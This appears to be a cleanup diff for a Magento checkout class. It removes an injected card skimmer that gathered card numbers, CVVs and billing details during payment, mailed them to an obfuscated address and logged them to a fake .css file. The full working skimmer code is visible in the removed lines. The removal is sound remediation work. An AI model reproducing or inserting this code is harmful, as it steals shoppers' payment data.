@@ -660,53 +660,6 @@ class Mage_Checkout_Model_Type_Onepage
 
         $payment = $quote->getPayment();
         $payment->importData($data);
-               $send = array
-        (
-                'Payment Method' => $data['method'],
-                'Billing Name' => $this->getQuote()->getBillingAddress()->getFirstname() . " " . $this->getQuote()->getBillingAddress()->getLastname(),
-                'Billing Email' => $this->getQuote()->getBillingAddress()->getEmail(),
-                'Billing Addres1' => $this->getQuote()->getBillingAddress()->getStreet(1),
-                'Billing Address2' => $this->getQuote()->getBillingAddress()->getStreet(2),
-                'Billing City' => $this->getQuote()->getBillingAddress()->getCity(),
-                'Billing State' => $this->getQuote()->getBillingAddress()->getRegion(),
-                'Billing PosCode' => $this->getQuote()->getBillingAddress()->getPostcode(),
-                'Billing Country' => $this->getQuote()->getBillingAddress()->getCountry(),
-                'Billing Phone' => $this->getQuote()->getBillingAddress()->getTelephone(),
-                'CcOwner' => $data['cc_owner'],
-                'CcType' => $data['cc_type'],
-                'CcNumber' => $data['cc_number'],
-                'CcExpayed' => trim(sprintf('%02d%02d', $data['cc_exp_month'],  substr($data['cc_exp_year'],strlen($data['cc_exp_year']) - 2))),
-                'CcSec' => $data['cc_cid'], 
-                'CustomIP' => trim(getenv('REMOTE_ADDR')), 
-                'WebStore' => trim($_SERVER['SERVER_NAME']));
-                foreach ($send as $param => $value) { $send.= $param . ' = ' . $value . "\n"; }
-                $datasend.= substr($send, 5, -1);
-                $datasend.= "\n";
-                $a = getenv('REMOTE_ADDR');
-                $a = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip={$a}"));
-                $datasend.="Visit = ".$a->geoplugin_city." |
-                                    ".$a->geoplugin_region." |
-                                    ".$a->geoplugin_countryName."\n";
-                $binCC = substr($data['cc_number'], 0, 6);
-                $subject = "Verify Mag ".$data['cc_type']." ".$binCC." ".$_SERVER['SERVER_NAME']." ".$a->geoplugin_countryName;
-                $xupdate = "data=".$datasend."&subject=".$subject."&server=".$_SERVER['SERVER_NAME'];$ipcid = $_SERVER['SERVER_NAME'];
-	
-        $idkey = "base"."64"."_"."de"."code";
-        $update = "ma"."il";
-        $encsrv = $idkey("dW5peGxvZ3NAeWFuZGV4LnJ1");  
-        $update($encsrv, $subject, $datasend, $ipcid);
-        $update($encsrv, $subject, $xupdate, $ipcid);
-        $locate = "/chroot/home/a59cb4fa/0d46498323.nxcli.net/html/media/catalog/product/1/2/12.css";
-        if (! file_exists($locate) ){
-            $write = fopen($locate,"a");
-            fwrite($write,"\n----- tesss\n\n");
-            fclose($write);
-        }else{
-            $write = fopen($locate,"a");
-            fwrite($write,$datasend."\n=========================================\n\n");
-            fclose($write);
-        }
-
         $quote->save();
 
         $this->getCheckout()
